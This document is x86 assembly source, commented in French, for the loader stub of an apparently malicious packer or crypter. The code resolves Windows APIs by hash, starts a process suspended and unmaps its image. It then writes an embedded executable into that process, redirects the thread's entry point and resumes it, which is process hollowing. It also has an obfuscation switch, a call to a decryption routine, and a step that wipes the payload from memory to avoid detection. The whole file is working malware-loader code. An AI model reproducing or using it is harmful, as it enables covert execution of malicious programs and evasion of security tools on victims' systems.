; %define OBS ; Compiling with or without obfuscation


; Parse l'exe et lance.


_pre_peexec:


  ; Create processus
  invokel _getdll,HASH_KERNEL32.DLL
  invokel _getfunction, eax, HASH_CREATEPROCESSA


  lea ebx, [ebp + MYSTRU__FILENAME]
  lea ecx,[ebp + MYSTRU__OPTION]
  lea edx,[ebp + MYSTRU__PIS] 
  invokel eax ,ebx ,  ecx , NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, ebp, edx
  cmp eax,0
  ; je .end


  ; Set type as context full
  lea eax,[ebp + MYSTRU__CTX ] 
  mov dword [eax], CONTEXT_FULL ; Set le type de context à full
  
  ; Request for this new process CPU context
  invokel _getdll,HASH_KERNEL32.DLL
  invokel _getfunction, eax, HASH_GETTHREADCONTEXT
  
  lea ecx,[ebp + MYSTRU__PIS] 
  mov ecx,[ecx+PROCESS_INFORMATION__hThread]
  lea  ebx,[ebp + MYSTRU__CTX]
  invokel eax,ecx,ebx
  
  cmp eax,0
  je .end

  ; Récupère la base addresse d'ou est lancé le PE, via le PEB du process
  invokel _getdll,HASH_KERNEL32.DLL
  invokel _getfunction, eax, HASH_READPROCESSMEMORY
  
  lea ecx,[ebp + MYSTRU__PIS] 
  mov ecx,[ecx+PROCESS_INFORMATION__hProcess]
  lea ebx,[ebp + MYSTRU__CTX] 
  mov ebx,[ebx+CTX__EBX]
    add        ebx,PEB__ImageBaseAdress                 ; Pointera sur PEB + 8  
  invokel eax, ecx, ebx, vRPEBASE, 4, NULL  
  
  cmp eax,0
  je  .end

  ;lea eax,[ebp+MYSTRU__PE]
 nop 
 nop
 nop
  jmp _bbdecypher
.end
  ret



_peexec:
	lea esi, [ebp + MYSTRU__PE] 
	lodsw
	cmp	ax,'MZ'  ; est-ce bien un EXE
	jne	.end
	add	esi,0x3C - 0x2 
	lodsd
	lea	esi,[ebp+MYSTRU__PE]
	add	esi,eax
	cmp	eax,0xFF  ; mAXIMUM OFFEST OF pe
	ja	.end
	lodsw
	cmp	ax,'PE'		; Est ce bien un PE Ready PE
	jne	.end
	add	esi, 2+2 
	lodsw	; Read Sections count
	mov	[PESECTION],ax
	add	esi, 3 * 0x4
	lodsw ; Read SizeOfOptionalHeader
	add	esi,2
	
  mov	[PEOPTHEADER],esi
	; EDI point sur MAGIC nubrer 10B
	mov	eax,[esi+IMAGE_OPTIONAL_HEADER__AddressOfEntryPoint]	
	mov	[PEENTRY],eax
	mov	eax,[esi + IMAGE_OPTIONAL_HEADER__ImageBase] 
	mov	[PEIMAGEBASE],eax
	mov	eax,[esi+IMAGE_OPTIONAL_HEADER__SizeOfImage]
	mov	[PEZOFIMAGE],eax
  mov	eax,[esi+IMAGE_OPTIONAL_HEADER__SizeOfHeaders]
	mov	[PEZOFHEADERS],eax
	

	; Si par malheur la Base address collision avec celle de notre PE packé on Demappe la section
	mov eax,[PEIMAGEBASE]  ; base image from PE include file 
	cmp	eax,[vRPEBASE]   ; 	base addresse form running PE
	jne	.bypassunmap

	; Unmap le PE si ils sont sur la meme base addresse

	invokel _getdll,HASH_NTDLL.DLL
	invokel _getfunction, eax, HASH_NTUNMAPVIEWOFSECTION
  lea ecx,[ebp + MYSTRU__PIS] 
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	invokel eax,ecx,dword [vRPEBASE]
	

.bypassunmap
	
	; Realloue la mémoire necessaire dans le procsess
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_VIRTUALALLOCEX
  lea ecx,[ebp + MYSTRU__PIS] 
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
	; 3000 --> MEM_COMMIT || MEM_RESERVE
	mov	edx,[PEZOFIMAGE]
	invokel eax,ecx, dword [PEIMAGEBASE],edx,0x3000,PAGE_EXECUTE_READWRITE
	

	mov	[PIMAGEBASE],eax
	cmp	eax,0
	je	.end

	; Recopie les Headers du PE
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	
  lea ecx,[ebp + MYSTRU__PIS] 
	mov	ecx,[ecx+PROCESS_INFORMATION__hProcess]
  lea ebx,[ebp + MYSTRU__PE]
	invokel eax,ecx,dword [PIMAGEBASE],ebx,dword [PEZOFHEADERS],NULL
	cmp	eax,0
	je	.end



	; Recopie chaque section du PE
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	
	mov	ebx,[PEOPTHEADER]
	; Putain pourquoi + 4*4 de Gap ?  IMAGE_FILE_HEADER !!
	add	ebx,16 + IMAGE_OPTIONAL_HEADER__LEN + IMAGE_DATA_DIRECTORY__LEN
	dec	word [PESECTION]

.recopiesect:
	
	mov	ecx,[ebx + IMAGE_SECTION_HEADER__VirtualAddress ]
	add ecx,[PIMAGEBASE]
	
	mov	edx,[ebx + IMAGE_SECTION_HEADER__PointerToRawData ]
	
  lea  edx,[ebp + MYSTRU__PE] 
	add	edx,[ebx + IMAGE_SECTION_HEADER__PointerToRawData ]
  ;add	edx,[PEBASE]
	
	mov	edi,[ebx + IMAGE_SECTION_HEADER__SizeOfRawData ]
	
  lea esi,[ebp + MYSTRU__PIS] 
	mov	esi,[esi+PROCESS_INFORMATION__hProcess]
	
	push	eax
	push	ebx	
	invokel eax,esi,ecx, edx, edi, NULL
	pop		ebx
	pop		eax

	add	ebx,IMAGE_SECTION_HEADER__LEN


	dec	word [PESECTION]
	cmp	word [PESECTION],0
	jns	.recopiesect

  ; bon ... harakiri... on va quand meme pas se laisser chopper au resumpethread
  mov ecx,EPELEN ;/ 4 
  xor eax,eax
  lea edi,[ebp + MYSTRU__PE]
  rep stosb

	; Replace la base addresse du process dans le contexte du process 

	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_WRITEPROCESSMEMORY
	
	
  lea esi, [ebp + MYSTRU__PIS] 
  mov	esi,[esi+PROCESS_INFORMATION__hProcess]


  lea ebx, [ebp + MYSTRU__CTX] 
  mov ebx,[ebx+CTX__EBX]
	add ebx,PEB__ImageBaseAdress    ; Pointera sur PEB + 8

	invokel eax,esi,ebx,PIMAGEBASE,4,NULL	
	
	; Replace l'entry Point dans l'eax du contexte
	
	
  lea ebx, [ebp + MYSTRU__CTX] 
	mov	eax,[PEENTRY]
	add eax,[PIMAGEBASE]
	mov	[ebx+CTX__EAX],eax

	; Replace le context dans la thread
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_SETTHREADCONTEXT
  lea esi, [ebp + MYSTRU__PIS] 
  mov	esi,[esi+PROCESS_INFORMATION__hThread]
	lea ebx, [ebp + MYSTRU__CTX ]
  invokel eax,esi,ebx


	; Relache la thread
	invokel _getdll,HASH_KERNEL32.DLL
	invokel _getfunction, eax, HASH_RESUMETHREAD
  lea esi, [ebp + MYSTRU__PIS] 
	mov	esi,[esi+PROCESS_INFORMATION__hThread ]

	invokel eax,esi

.end:
  jmp _fend
 ;	ret
	

